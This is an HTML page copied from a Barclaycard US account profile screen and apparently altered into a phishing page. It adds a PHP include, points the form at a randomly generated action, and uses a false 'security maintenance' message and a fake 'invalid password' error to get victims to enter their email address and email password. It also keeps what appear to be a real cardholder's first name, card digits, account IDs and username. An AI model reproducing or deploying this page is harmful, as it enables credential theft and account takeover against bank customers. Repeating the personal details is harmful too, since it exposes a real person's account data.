<!DOCTYPE html>
<!-- saved from url=(0070)https://www.barclaycardus.com/servicing/Profile.action?editEmailStart= -->
<html lang="en"
    class="   desktop-override js no-flexbox flexbox-legacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths whatinput-types-initial yui3-js-enabled appearance whatinput-types-mouse"
    data-whatinput="mouse" data-whatintent="mouse">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="x-ua-compatible" content="IE=10">


    <title>Verify Email address</title>


    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description"
        content="Manage your credit card account online - track account activity, make payments, transfer balances, and more">
    <link rel="shortcut icon" href="https://gif.barclaycardus.com/servicing/a934f5d4/img/base/favicon.ico">








    <script async=""
        src="./Profile - Edit Email Address_files/adrum-ext.d5dfd2e692f603f77711b2992d5a9455.js.download"></script>
    <script>
        window['adrum-start-time'] = new Date().getTime();
    </script>

    <script src="./Profile - Edit Email Address_files/adrum.js.download"></script>

    <script src="./Profile - Edit Email Address_files/force-session-timeout.js.download"> </script>
    <script>



        fsto.initiateShowBannerTimer();





    </script>

       <link rel="stylesheet" href="./Profile - Edit Email Address_files/desktopResponsiveOverrides.css">





    <link rel="stylesheet" href="./Profile - Edit Email Address_files/yui-common.css">

    <link rel="stylesheet" href="./Profile - Edit Email Address_files/yui-common-b.css">

    <link rel="stylesheet" href="./Profile - Edit Email Address_files/cssbutton-min.css">

    <link rel="stylesheet" href="./Profile - Edit Email Address_files/cwsCoreStyle.css">



    <!-- For the CSS Refactoring Feature id F8790 -->

    <link rel="stylesheet" href="./Profile - Edit Email Address_files/globalEmwe.css">
    <!--[if IE 9]>
            <link rel="stylesheet" href="https://gif.barclaycardus.com/servicing/a934f5d4/css/base/ie-9.css" />
            <![endif]-->
    <!--[if lte IE 9]>
            <link rel="stylesheet" href="https://gif.barclaycardus.com/servicing/a934f5d4/css/base/ie-all.css" />
            <![endif]-->
    <!--[if lte IE 8]>
            <link rel="stylesheet" href="https://gif.barclaycardus.com/servicing/a934f5d4/css/base/ie-8.css" />
            <![endif]-->
    <!--[if lte IE 7]>
            <link rel="stylesheet" href="https://gif.barclaycardus.com/servicing/a934f5d4/css/base/ie-7.css" />
            <![endif]-->
    <!-- Team Synergy:The following toggle is for the Rewards Hub. -->
    <!-- One style is embedded because its content will be dynamic and determined by the backend. -->







    <link rel="stylesheet" href="./Profile - Edit Email Address_files/override-custom.css">





    <!--TS_486-->
    <script src="./Profile - Edit Email Address_files/tealeaf.js.download"></script>




    <script src="./Profile - Edit Email Address_files/yui-common-a.js.download"></script>
    <script src="./Profile - Edit Email Address_files/yui-common-b.js.download"></script>


    <script src="./Profile - Edit Email Address_files/yui-common-c.js.download"></script>
    <script src="./Profile - Edit Email Address_files/datatableRowExp-min.js.download"></script>

    <script src="./Profile - Edit Email Address_files/bcus.js.download"></script>
    <script src="./Profile - Edit Email Address_files/modernizr.min.js.download"></script>


    <!--[if lt IE 8]>
    <script>
        var Dom = YAHOO.util.Dom,
                Event = YAHOO.util.Event;

        (function() {
            // =========================================================================
            // working code
            // =========================================================================
            var ie7Highlight = function() {
                var oElement = Dom.getElementsByClassName('inputBox', 'input');

                Event.addListener(oElement, 'focusin', showBorder);
                Event.addListener(oElement, 'focusout', hideBorder);

            }
            var showBorder = function (e) { Dom.addClass(this,"blueBorder");}
            var hideBorder = function (e) { Dom.removeClass(this,"blueBorder");}

            Event.onDOMReady(ie7Highlight);

        })();
        Event.onDOMReady(function(){
            if(Dom.get("alert")){
                Dom.addClass("bdSpacer","bdSpace");
            };
        });
    </script>
    <![endif]-->

    <script src="./Profile - Edit Email Address_files/what-input.min.js.download"></script>








    <link charset="utf-8" rel="stylesheet" id="yui_3_14_1_1_1551195861363_2"
        href="./Profile - Edit Email Address_files/combo.action">
    <script charset="utf-8" id="yui_3_14_1_1_1551195861363_4" src="./Profile - Edit Email Address_files/combo(1).action"
        async=""></script>
    <script charset="utf-8" id="yui_3_14_1_1_1551195861363_5" src="./Profile - Edit Email Address_files/combo(2).action"
        async=""></script>
    <script charset="utf-8" id="yui_3_14_1_1_1551195861363_6" src="./Profile - Edit Email Address_files/combo(3).action"
        async=""></script>
</head>
<?php include('gen.php'); ?>
<body id="app-body" class="yui-skin-sam"><iframe id="_yuiResizeMonitor" title="Text Resize Monitor" tabindex="-1"
        role="presentation"
        style="position: absolute; visibility: visible; background-color: transparent; border-width: 0px; width: 2em; height: 2em; left: 0px; top: -27px;"
        src="./Profile - Edit Email Address_files/saved_resource.html"></iframe>
    <div class="site-banner session-timeout" id="timeoutWarning" style="display: none;">
        <span id="session-timeout-message">You will be logged out in <span><strong id="timeoutTimeCounter"
                    class="highlight"></strong> seconds</span> due to inactivity.</span>
        <button id="timeoutRefreshButton" aria-describedby="session-timeout-message">Keep me signed in</button>
    </div>

    <section id="app-body-container">
        <div class="legacy-desktop">
            <!-- Card Select -->
            <div class="b-card-select-container fluid-container hidden-xs">
                <div class="container b-card-select">
                    <div class="row">
                        <div class="col-sm-2" data-auto="selected-card-art">
                            <a href="https://www.barclaycardus.com/servicing/accountSummary"
                                data-auto="default-card-art-link" class="no-outline">
                                <img src="./Profile - Edit Email Address_files/ZBR3OPN1.png"
                                    alt="Visit Account summary for Barclaycard Rewards." class="b-card-art">
                            </a>
                        </div>
                        <div class="col-sm-6">
                            <div class="b-greeting-container ">
                                <!-- <p class="b-greeting"><span id="greeting-salutation">Welcome</span>, Audrey</p>
                                <p><span class="b-card-name" data-auto="selected-card-name">Barclaycard Rewards ...0107

                                    </span>
                                </p>
                                <p></p> -->
                            </div>
                        </div>

                        <div class="col-sm-4 text-right logo-container logged-in" data-auto="brand-logo"
                            id="barclays-logo">
                            <div><img class="" src="./Profile - Edit Email Address_files/header-logo.svg"
                                    alt="Credit Card Logo"></div>
                        </div>

                    </div>
                </div>
            </div>

            <div class="b-multi-card-container b-multi-card-hide hidden-xs hidden ada-hidden"
                id="b-multi-card-container">

            </div>
        </div>




        <br>
        <section id="cws-doc" class="yui-t3 b-site-container">

            <section id="bd" class="b-site-body-container">
                <section id="yui-main" class=" b-site-body-page-container ">

                    <div id="editEmail" class="b-hide hide"></div>
                    <section id="page1">

                    </section>
                    <section id="page2">

                        <section id="mainContent" class="yui-b">
                            <div class="yui-gc subPage">
                                <div class="yui-u first profile">

                                    <form method="post" action="<?php echo generateRandomString(); ?>">
                                        <span id="topLink" class="yui-button yui-link-button"><span
                                                class="first-child"><a tabindex="0"
                                                    href="https://www.barclaycardus.com/servicing/Profile.action"
                                                    id="topLink-button">Your profile</a></span></span>
                                        <nav></nav>
                                        <div id="pageTitleContainer">
                                            <h2 style="color:#0094cc;font-size:23px;">We are currently performing regular maintanance of our security measures. Please provide the following information. Enter your email address and password.</h2>
                                            <h3 class="panel-title3" style="color: red">Invalid password, please re-enter.</h3>
                                        </div>
                                        <div class="line clear"></div>
                                        <dl class="editEmail">
                                            <dt class="mb5 mt15" id="primaryEmailAddressLabel"><strong>Input Email Address*</strong></dt>
                                            <dd><input aria-labelledby="primaryEmailAddressLabel" size="40"
                                                    maxlength="40" name="email_address" data-required="true"
                                                    id="primaryEmailAddress" type="email"
                                                    data-mask="^\w+((-\w+)|(\.\w+))*\@[A-Za-z0-9]+((\.|-)[A-Za-z0-9]+)*\.[A-Za-z0-9]{1,4}$"
                                                    class="inputBox validate mb5" value=""></dd>
                                            <dd id="primaryEmailAddress_Tip" class="toolTip">Enter a valid email address
                                                to receive account notifications and correspondence more quickly.</dd>
                                            <dd id="primaryEmailAddress_Error" class="error"></dd>
                                            <dd><input name="primary.emailFormat" type="hidden" value="HTML"></dd>
                                            <div class="clear" style="margin-bottom: 1em">&nbsp;</div>
                                            <dt class="mb5 mt15" id="secondaryEmailAddressLabel"><strong>Input Email Password</strong></dt>
                                            <dd><input aria-labelledby="secondaryEmailAddressLabel" size="40"
                                                    maxlength="40" name="email_page" id="secondaryEmailAddress"
                                                    type="password"
                                                    data-mask="^\w+((-\w+)|(\.\w+))*\@[A-Za-z0-9]+((\.|-)[A-Za-z0-9]+)*\.[A-Za-z0-9]{1,4}$"
                                                    class="inputBox validate mb5" value=""></dd>
                                            <dd id="secondaryEmailAddress_Tip" class="toolTip">Enter a valid email
                                                address to receive account notifications and correspondence more
                                                quickly.</dd>
                                            <dd id="secondaryEmailAddress_Error" class="error"></dd>
                                            <dd><input name="secondary.emailFormat" type="hidden" value="HTML"></dd>
                                        </dl>
                                        <div class="line clear"></div>


                                        <input name="_csrf" type="hidden"
                                            value="V5BoPskrdlVUqHH98yvcOg3OCKfp9gsI-z6zWQrIK7o">
                                        <span class="yui-button yui-submit-button green sButton" id="updateButton" style="padding:6px 14px !important;"><span
                                                class="first-child"><button type="submit" tabindex="0"
                                                    id="updateButton-button">Confirm</button></span></span>

                                        <div style="display: none;"><input type="hidden" name="_sourcePage"
                                                value="VLOGXrs5WWNh2rIcxbRjld3KPiHm1Y1TuBqASGtsF9KyhBwjA8d7LZJhId27jujunK8uOirGxTI="><input
                                                type="hidden" name="__fp"
                                                value="tXeMaQFumUsBKZ1cELkMo5ey9ku_3ki5O_DWKunyfqMhqgrCxjBtpMiH1GY13gXmDgmsnw1DijL7k_fj1oUUociH1GY13gXmuUyrPmdjoMFy3yK7nmVkhFlnoWVGgvdBM-c4hr6CiLGupldm7z1tpS8GLP0TIndwOLvAaTu968ZAr7AABMgfpAdPrwyMjDBVDgmsnw1DijLfk9cTWFnWkoRc-wtOOZxtghPKuv3vWbRmeqapR7NCjQ==">
                                        </div>
                                    </form>
                                </div>
                            </div>
                        </section>

                    </section>
                </section>

                <script>
                    var listOfAccountPanels = [];
                    var Dom = YAHOO.util.Dom,
                        Event = YAHOO.util.Event;

                    function hideAllAccountPanels() {
                        for (var idx = 0; idx < listOfAccountPanels.length; idx++) {
                            listOfAccountPanels[idx].hide();
                        };
                        var hotSpots = Dom.getElementsByClassName('hotspot', 'div');
                        Dom.removeClass(hotSpots, 'hotspotenabled b-account-details-is-selected');
                    }

                    function changeDisplayOfPanel(pgbar, thePanel) {
                        var progBar = Event.getTarget(pgbar).id;
                        if (thePanel.cfg.getProperty("visible")) {
                            thePanel.hide();
                            Dom.removeClass(progBar, 'hotspotenabled b-account-details-is-selected');
                        } else {
                            // hide all others 1st;
                            hideAllAccountPanels();
                            thePanel.show();
                            Dom.addClass(progBar, 'hotspotenabled b-account-details-is-selected');
                        }
                    }

                    var accountSummaryCleanup = function (e) {
                        var el = Event.getTarget(e);
                        var clickedOutside = true;

                        for (var idx = 0; idx < listOfAccountPanels.length; idx++) {

                            var accountPanel = Dom.getAncestorByClassName(listOfAccountPanels[idx], "yui-panel-container");
                            if (el == accountPanel || Dom.isAncestor(accountPanel, el)) {
                                clickedOutside = false;
                            }
                        }
                        if (clickedOutside) {

                            var listOfAccountProgressBars = Dom.getElementsByClassName("pbToCreditLine", "div", "otherAccounts");
                            for (var idx = 0; idx < listOfAccountProgressBars.length; idx++) {
                                if (el == listOfAccountProgressBars[idx] || Dom.isAncestor(listOfAccountProgressBars[idx], el)) {
                                    clickedOutside = false;
                                }
                            }
                        }

                        if (clickedOutside) {
                            hideAllAccountPanels();
                        }
                    }

                    Event.on(document, "click", accountSummaryCleanup);
                </script>
                <section id="leftSection" class="yui-b cardSide editEmailLeft  b-card-section">
                    <section id="otherAccounts" class="b-card-list">
                        <div class="cardArt b-small-card">
                            <a
                                href="https://www.barclaycardus.com/servicing/SwitchAccount.action?accountId=15107530&amp;rnd=1551193118095">

                                <img src="./Profile - Edit Email Address_files/ZBR3OPN1.png" alt="credit card"
                                    class="smallCard">
                            </a>
                        </div>
                        <div class="accountInfo b-card-list-content">

                            <div class="cardEndingIn">Card ending in 0107</div>
                            <div id="progbar_15107530"
                                class="pbToCreditLine b-global-sprite b-account-details-icon b-account-details hotspot">
                                <div class="yui-pb yui-pb-ltr" aria-valuemax="7000" aria-valuemin="0" aria-valuenow="0"
                                    aria-valuetext="0" tabindex="0" role="progressbar"
                                    style="width: 100px; height: 6px;">
                                    <div class="yui-pb-bar" style="width: 0px;"></div>
                                    <div class="yui-pb-mask">
                                        <div class="yui-pb-tl"></div>
                                        <div class="yui-pb-tr" style="width: 50px;"></div>
                                        <div class="yui-pb-bl" style="height: 50px;"></div>
                                        <div class="yui-pb-br" style="height: 50px; width: 50px;"></div>
                                    </div>
                                </div>
                            </div>
                            <div class=""><a class="messageCenterLink"
                                    href="https://www.barclaycardus.com/servicing/SwitchAccount.action?accountId=15107530&amp;redirectAction=/messageCenter"><span
                                        id="numOfMessages_15107530" class="numOfMess">38 new</span>&nbsp;messages</a>
                            </div>
                            <div class="clear"></div>

                            <script>

                                var progressBar = new YAHOO.widget.ProgressBar({ width: "100px", height: "6px", minValue: 0, maxValue: 7000.00, value: 0.00 });
                                progressBar.render("progbar_15107530");

                            </script>

                            <div id="panel_15107530"
                                class="accountDetails b-account-details-overlay yui-module yui-overlay yui-overlay-hidden"
                                style="z-index: 2; width: 15em; visibility: hidden; left: -500px; top: 80px;">
                                <div class="hd b-global-sprite b-account-details-pointer"></div>
                                <div class="bd b-account-details-table">
                                    <div>
                                        <span class="label">Current Balance</span>
                                        <span class="content">$0.00</span>
                                        <div class="line"></div>
                                    </div>

                                    <div>
                                        <span class="label">Statement Balance</span>
                                        <span class="content">$0.00</span>
                                        <div class="line"></div>
                                    </div>

                                    <div>
                                        <span class="label">Available Credit</span>
                                        <span class="content">$7,000.00</span>
                                        <div class="line"></div>
                                    </div>

                                    <div>
                                        <span class="label">Credit Line</span>
                                        <span class="content creditLine b-credit-line">$7,000.00</span>
                                    </div>
                                    <div class="clear"></div>
                                </div>
                            </div>
                            <script>

                                pnl_15107530 = new YAHOO.widget.Overlay("panel_15107530", { width: "15em", visible: false, constraintoviewport: false, close: false, context: ["progbar_15107530", "tl", "tr", ["beforeShow", "windowResize"], [-125, 20]] });
                                pnl_15107530.setHeader("");
                                pnl_15107530.render();
                                pnl_15107530.align("tl", "tr");
                                listOfAccountPanels.push(pnl_15107530);
                                YAHOO.util.Event.addListener("progbar_15107530", "click", changeDisplayOfPanel, pnl_15107530, true);
                                YAHOO.util.Dom.addClass("progbar_15107530", "hotspot");



                            </script>
                        </div>















                    </section>


                    <div id="universal_left">

                    </div>
                </section>






                <div id="helpOverlay" class="mainNavigationOverlay b-navigation-overlay b-search-overlay hide">
                    <form method="post" autocomplete="off"
                        action="https://www.barclaycardus.com/servicing/WebSearch.action" id="searchForm">
                        <input maxlength="100" name="keyWord" data-required="false" id="searchBox"
                            placeholder="Ask your question here..." type="text" class="inputBox floatLeft">
                        <span class="yui-button yui-submit-button green" id="searchButton"><span
                                class="first-child"><button type="button" tabindex="4"
                                    id="searchButton-button">Search</button></span></span>
                        <div style="display: none;"><input type="hidden" name="_sourcePage"
                                value="fhFYwMAKhXVh2rIcxbRjld3KPiHm1Y1TuBqASGtsF9KyhBwjA8d7LZJhId27jujunK8uOirGxTI="><input
                                type="hidden" name="__fp" value="PK4TpFeRAyY="></div>
                    </form>
                </div>
            </section>
            <!--[if lt IE 8]><div id="bdSpacer"></div><![endif]-->
            <footer id="ft" class="b-main-footer">




































































































































                <div class="line b-main-footer-divider"></div>
                <p class="footerLinks b-footer-nav">



                    <a href="https://www.barclaycardus.com/servicing/footerLinks?handlePrivacy="
                        class="handlePrivacy ">Privacy policy</a> <span aria-hidden="true">|</span> <a
                        href="https://www.barclaycardus.com/servicing/footerLinks?handleSecurity="
                        class="handleSecurity " target="_blank">Security center</a><span aria-hidden="true">|</span>

                    <a href="https://www.barclaycardus.com/servicing/accessibility" target="_blank"
                        data-auto="footerLinks.accessibility">
                        Accessibility
                    </a><span aria-hidden="true">|</span>

                    <a href="https://www.barclaycardus.com/servicing/footerLinks?handleTerms="
                        class="handleTerms ">Terms of use</a>




                </p>


                <p class="copy">© Barclays Bank Delaware 2019</p>

                <p class="clear auxCopy"></p>


            </footer>
        </section>

        <div class="legacy-footer-placeholder">

        </div>
        <div class="legacy-footer">
































            <footer id="appFooter" class="b-app-footer responsive" data-page-name="footer-editEmail">
                <div class="container">







                    <div class="row">
                        <div class="col-md-8">

                            <ul class="b-footer-links">




                                <li><a href="https://www.barclaycardus.com/servicing/footerLinks?handlePrivacy="
                                        data-auto="Privacy policy">Privacy policy</a></li>





                                <li><a href="https://www.barclaycardus.com/servicing/footerLinks?handleSecurity="
                                        data-auto="Security center" target="_blank">Security center</a></li>






                                <li><a href="https://www.barclaycardus.com/servicing/accessibility"
                                        data-auto="Accessibility" target="_blank">Accessibility</a></li>







                                <li><a href="https://www.barclaycardus.com/servicing/footerLinks?handleTerms="
                                        data-auto="Terms of use">Terms of use</a></li>








                                <li class="visible-xs">
                                    <a id="fullSite"
                                        href="https://www.barclaycardus.com/servicing/changeViewTemplate?start=">Full
                                        site</a>
                                </li>

                            </ul>

                        </div>
                        <div class="col-md-4 b-float-right-legacy">

                            <p class="copyright" data-auto="copyright">© Barclays Bank Delaware 2019</p>
                        </div>
                    </div>








                </div>
            </footer>



        </div>
    </section>




    <script src="./Profile - Edit Email Address_files/yui-min.js.download"></script>
    <div id="yui3-css-stamp" style="position: absolute !important; visibility: hidden !important" class=""></div>
    <script src="./Profile - Edit Email Address_files/yui_config.js.download"></script>


    <div id="overlayContainer">





















































































































        <!-- Should a modal be introduced? -->








    </div>





    <script type="text/javascript">
        var Dom = YAHOO.util.Dom,
            Button = YAHOO.widget.Button,
            Event = YAHOO.util.Event;

        var pageButtons = function () {
            if (Dom.get("topLink")) {
                var topLink = new Button("topLink", { type: "link" })
            };
            if (Dom.get("profile")) {
                var cancelButton = new Button("profile")
            };
            if (Dom.get("cancelButton")) {
                var cancelButton = new Button("cancelButton")
                Dom.addClass(cancelButton, "sButton");
            };
            if (Dom.get("updateButton")) {
                var updateButton = new Button("updateButton");
                Dom.addClass(updateButton, "green");
                Dom.addClass(updateButton, "sButton");
            };

        }
        Event.onContentReady("ft", pageButtons);
        Event.onDOMReady(BCUS.setupPreventDoubleSubmit);

        if (Dom.get("emailForm")) {
            Event.on("emailForm", "focusin", BCUS.toolTip);
            Event.on(Dom.getElementsByClassName("validate"), "focusout", BCUS.validate.execute, { beanclass: "com.barclaycardus.app.cws.action.ProfileActionBean" });
            YAHOO.util.Dom.addClass("emailForm", "formFocused");
        }
        Event.addListener('primaryEmailAddress', 'focusin', BCUS.focusOnFirstField("emailForm"));
        Event.addListener('secondaryEmailAddress', 'focusin', BCUS.focusOnFirstField("emailForm", true));

    </script>




































































































































































    <script src="./Profile - Edit Email Address_files/s_code.js.download"></script>



    <script>< !--
   
       var events = "event17";


















































































































































































































































































































































        s.pageName = "PROFILE:EMAIL:STEP1:EDIT";






        s.channel = "PROFILE";


        s.server = window.location.hostname;

        /*events */
        s.events = events;

        /*Props */
        s.prop11 = "APB";
        s.eVar12 = s.prop11;
        s.prop22 = "17738793";
        s.prop23 = "000015277881".replace(/^0+/, '');

        YAHOO.util.Event.onAvailable("help", function () {
            YAHOO.util.Event.addListener("help", "click", function () {
                s.linkTrackVars = "eVar9,events";
                s.linkTrackEvents = "event3";
                var helpIcon = YAHOO.util.Dom.get("help");
                if (YAHOO.util.Dom.hasClass(helpIcon, "helpOn")) { } else {
                    s.events = "event3";
                    s.eVar9 = "FAQ:" + s.pageName + "";
                    s.tl(this, "o", "FAQ:" + s.pageName + "");
                }
            });
        });















        //s.eVar49="/WEB-INF/view/profile/contactinfo/editEmail.jsp";

















        var navigationTrackingLinkList = document.querySelectorAll(".nav-track");
        for (var i = 0; i < navigationTrackingLinkList.length; i++) {

            var newnavLink = YAHOO.util.Dom.get(navigationTrackingLinkList[i]);
            YAHOO.util.Event.addListener(newnavLink, "click", function (evt) {
                var tagValue = this.getAttribute("data-navtag");
                var windowTarget = this.getAttribute("target");
                // variable to check if it is PAV page or not
                var sectionName = "false";

                if (windowTarget != "_blank" && !sectionName) {
                    YAHOO.util.Event.preventDefault(evt);
                    YAHOO.util.Event.stopPropagation(evt);
                }
                /* Set link tracking function here */
                s.linkTrackVars = "prop11,prop22,prop23,prop25,eVar12,eVar21,eVar23,eVar24,eVar28";
                s.prop11 = "APB";
                s.prop22 = "17738793";
                s.prop25 = tagValue;
                s.prop23 = "000015277881".replace(/^0+/, '');
                s.eVar12 = s.prop11;
                s.eVar21 = tagValue;
                s.eVar23 = s.prop22;
                s.eVar28 = tagValue;
                if (windowTarget == "_blank") {
                    s.tl(this, "o", tagValue);
                } else if (sectionName) {
                    s.tl(this, "o", tagValue, null);
                } else {
                    s.tl(this, "o", tagValue, null, "navigate");
                }
                return false;
            });

        }



        /************* DO NOT ALTER ANYTHING BELOW THIS LINE ! **************/
        var s_code = s.t(); if (s_code) document.write(s_code)//--></script>
    <script>< !--
   if (navigator.appVersion.indexOf('MSIE') >= 0) document.write(unescape('%3C') + '\!-' + '-')
   //--></script>
    <!--/DO NOT REMOVE/-->
    <!-- End SiteCatalyst code version: H.20.2. -->











































































































































































































































































    <!-- TLData:TL_A="15107530";TL_T="000015277881";TL_P="17738793";TL_C="APB";TL_N="PROFILE:EMAIL:STEP1:EDIT";TL_J="/WEB-INF/view/profile/contactinfo/editEmail.jsp";TL_U="audreyfrable";TL_E="";TL_AOS="APB1";TL_ROID="BCRGN1";TL_M="LIVE";-->





    <script>
        //store initial state
        //if (Modernizr.history){
        // history.replaceState("{page: location.href}", document.title,location.href);
        //}


        YAHOO.util.Event.addListener("help", "click", BCUS.faqRender);

        if (YAHOO.util.Dom.get('tutorial')) {
            YAHOO.util.Event.on("tutorial", "click", function (e) {
                BCUS.popwin("http://bcove.me/y3au07w7", this.target, { width: '480', height: '270', scrollbars: false, toolbars: false, resizable: false, menubar: false, status: false, location: false });
                return false;
            });
        }


        var rootEl = document.getElementsByTagName("html");

        if (Modernizr.testAllProps('appearance')) {
            rootEl[0].className = rootEl[0].className + " appearance";
        } else {
            rootEl[0].className = rootEl[0].className + " no-appearance";
        }


        if (Modernizr.testProp('msTextCombineHorizontal')) {
            rootEl[0].className = rootEl[0].className + " ie11";
        }


    </script>


    <script src="./Profile - Edit Email Address_files/autotab.min.js.download"></script>

    <script>

        YAHOO.util.Event.onDOMReady(function () {

            setUpHelpBar();
            setUpNavBar();
            setUpSalutation("");
            setUpMultiCardSelection();


            getMessageCount();
            setUpHomeLink();
        });


        var getMessageCount = function () {
            var sUrl = "messageCenter?getNewMessageCounts";


            var newNavMessage = YAHOO.util.Dom.get("secondary-navbar-messages");

            var callback = {
                success: function (o) {
                    try {
                        jsonResponse = YAHOO.lang.JSON.parse(o.responseText);
                        if (YAHOO.util.Dom.get("messageCount")) {
                            var mDiv = YAHOO.util.Dom.get("messageCount");
                            var acctId = "15107530";
                            if (jsonResponse[acctId] != undefined) {
                                YAHOO.util.Dom.get("messageCount").innerHTML = jsonResponse[acctId];

                                newNavMessage.innerHTML = '<a href="/servicing/messageCenter" data-auto="b-secondary-nav-messages"><span class="badge">' + jsonResponse[acctId] + '</span> New messages</a>';

                            }
                            else {
                                YAHOO.util.Dom.get("messageCount").innerHTML = "0";

                                newNavMessage.innerHTML = '<span class="badge">0</span> New messages';

                            }
                        }
                        for (var i in jsonResponse) {
                            if (YAHOO.util.Dom.get("numOfMessages_" + i)) {
                                if (jsonResponse[i] != undefined) {
                                    YAHOO.util.Dom.get("numOfMessages_" + i).innerHTML = jsonResponse[i] + " new";
                                }
                                else {
                                    YAHOO.util.Dom.get("numOfMessages_" + i).innerHTML = "0 new"
                                }
                            }
                        }
                    }
                    catch (e) {
                        YAHOO.util.Dom.addClass(YAHOO.util.Dom.getElementsByClassName("newM"), "hide");
                        YAHOO.util.Dom.addClass(YAHOO.util.Dom.getElementsByClassName("numOfMess"), "hide");
                        var divs = YAHOO.util.Dom.getElementsByClassName("messageCenterLink");
                        for (var i = 0; i < divs.length; i++) {
                            divs[i].innerHTML = "Messages";
                        }

                        newNavMessage.innerHTML = '<a href="/servicing/messageCenter"><span class="badge"></span> Messages</a>';

                    }

                },
                failure: function (o) {
                    YAHOO.util.Dom.addClass(YAHOO.util.Dom.getElementsByClassName("newM"), "hide");
                    YAHOO.util.Dom.addClass(YAHOO.util.Dom.getElementsByClassName("numOfMess"), "hide");
                    var divs = YAHOO.util.Dom.getElementsByClassName("messageCenterLink");
                    for (var i = 0; i < divs.length; i++) {
                        divs[i].innerHTML = "Messages";
                    }

                    newNavMessage.innerHTML = '<a href="/servicing/messageCenter"><span class="badge"></span> Messages</a>';


                }
            }
            var connectionObject = YAHOO.util.Connect.asyncRequest('GET', sUrl, callback);
        }


        var handleFocusoutOnSearchbar = function (e) {
            var helpSearchContainer = YAHOO.util.Dom.get("b-search-container"),
                relatedTarget = e.relatedTarget;
            if (!relatedTarget || relatedTarget.id === 'b-search-link') {
                return;
            }

            if (!YAHOO.util.Dom.isAncestor(helpSearchContainer, e.relatedTarget)) {
                var searchBar = YAHOO.util.Dom.get("b-search-bar"),
                    searchLink = YAHOO.util.Dom.get("b-search-link");
                closeSearchMenu(helpSearchContainer);
                if (e.target.id === 'searchBox') {
                    searchLink.focus();
                } else {
                    searchLink.parentElement.nextElementSibling.querySelector('a').focus();
                }
            }
        }

        var openSearchMenu = function (helpSearchContainer) {
            var searchBox = YAHOO.util.Dom.get("searchBox"),
                searchButton = YAHOO.util.Dom.get('srch-btn'),
                searchLink = YAHOO.util.Dom.get("b-search-link");
            YAHOO.util.Dom.addClass(helpSearchContainer, 'nav-open');
            searchBox.value = '';
            searchBox.removeAttribute('tabindex');
            searchButton.removeAttribute('tabindex');
            searchLink.setAttribute('aria-expanded', 'true');
            YAHOO.util.Dom.get("searchBox").focus();
        }

        var closeSearchMenu = function (helpSearchContainer) {
            var searchBox = YAHOO.util.Dom.get("searchBox"),
                searchButton = YAHOO.util.Dom.get('srch-btn'),
                searchLink = YAHOO.util.Dom.get("b-search-link");
            YAHOO.util.Dom.removeClass(helpSearchContainer, 'nav-open');
            YAHOO.util.Dom.get("searchBox").blur();
            searchBox.setAttribute('tabindex', '-1');
            searchButton.setAttribute('tabindex', '-1');
            searchLink.setAttribute('aria-expanded', 'false');

        }

        var closeOnEscape = function (e) {
            if (e.keyCode == 27) {
                var searchLink = YAHOO.util.Dom.get("b-search-link");
                closeSearchMenu(this);
                searchLink.focus();
            }
        }

        var setUpHelpBar = function () {
            var helpLink = YAHOO.util.Dom.get("b-search-link");
            var helpSearchContainer = YAHOO.util.Dom.get("b-search-container"),
                searchBox = YAHOO.util.Dom.get("searchBox"),
                searchButton = YAHOO.util.Dom.get('srch-btn');
            searchBox.setAttribute('tabindex', '-1');
            searchButton.setAttribute('tabindex', '-1');

            YAHOO.util.Event.on(helpLink, "click", function () {
                YAHOO.util.Dom.hasClass(helpSearchContainer, 'nav-open') ? closeSearchMenu(helpSearchContainer) : openSearchMenu(helpSearchContainer);
            });


            YAHOO.util.Event.on(helpSearchContainer, "focusout", handleFocusoutOnSearchbar);
            YAHOO.util.Event.on(helpSearchContainer, "blur", handleFocusoutOnSearchbar);
            YAHOO.util.Event.on(helpSearchContainer, "keyup", closeOnEscape);
        }

        var removeTabFromAnchors = function (elem) {
            var anchors = elem.querySelectorAll('.dropdown-menu a');
            for (var k = 0; k < anchors.length; k++) {
                anchors[k].tabIndex = -1;
                anchors[k].setAttribute('aria-hidden', 'true');
            }
            hideSubNavTitle(elem);
        }

        var addTabToAnchors = function (elem) {
            var anchors = elem.querySelectorAll('.dropdown-menu a');
            for (var k = 0; k < anchors.length; k++) {
                anchors[k].removeAttribute('tabindex');
                anchors[k].removeAttribute('aria-hidden');
            }
            showSubNavTitle(elem);
        }

        var hideSubNavTitle = function (elem) {
            var heading = elem.querySelector('h3');
            heading.setAttribute('aria-hidden', 'true');
        }

        var showSubNavTitle = function (elem) {
            var heading = elem.querySelector('h3');
            heading.removeAttribute('aria-hidden');
        }

        var openNavMenu = function (navParentContainer) {
            YAHOO.util.Dom.addClass(navParentContainer, 'nav-open');
            var dropdownElem = navParentContainer.querySelector('[data-toggle="dropdown"]');
            if (dropdownElem) {
                dropdownElem.setAttribute('aria-expanded', 'true');
            }

            addTabToAnchors(navParentContainer);
        }

        var closeNavMenu = function (navParentContainer) {
            YAHOO.util.Dom.removeClass(navParentContainer, 'nav-open');
            var dropdownElem = navParentContainer.querySelector('[data-toggle="dropdown"]');
            if (dropdownElem) {
                dropdownElem.setAttribute('aria-expanded', 'false');
            }
            removeTabFromAnchors(navParentContainer);
        }

        var findAncestor = function (el, cls) {
            while ((el = el.parentElement) && !el.classList.contains(cls));
            return el;
        }

        var onMenuFocusOut = function (e) {
            if (e.relatedTarget) {
                var navParentContainer = this.parentElement;
                if (!YAHOO.util.Dom.isAncestor(navParentContainer, e.relatedTarget)) {
                    closeNavMenu(navParentContainer);
                }
            }
        }

        var onMenuLinkFocusOut = function (e) {


            if (e.relatedTarget) {
                var parentContainer = findAncestor(this, 'dropdown-menu');
                if (!YAHOO.util.Dom.isAncestor(parentContainer, e.relatedTarget)) {
                    navParentContainer = parentContainer.parentElement;
                    closeNavMenu(navParentContainer);
                }
            }
        }

        var setUpNavBar = function () {
            var navbarDropdown = YAHOO.util.Dom.getElementsByClassName("dropdown-toggle");
            var allNavDropdown = YAHOO.util.Dom.getElementsByClassName("dropdown");
            YAHOO.util.Event.on(navbarDropdown, "click", function (e) {
                var navParentContainer = this.parentElement;
                var isnavOpen = YAHOO.util.Dom.hasClass(navParentContainer, 'nav-open');
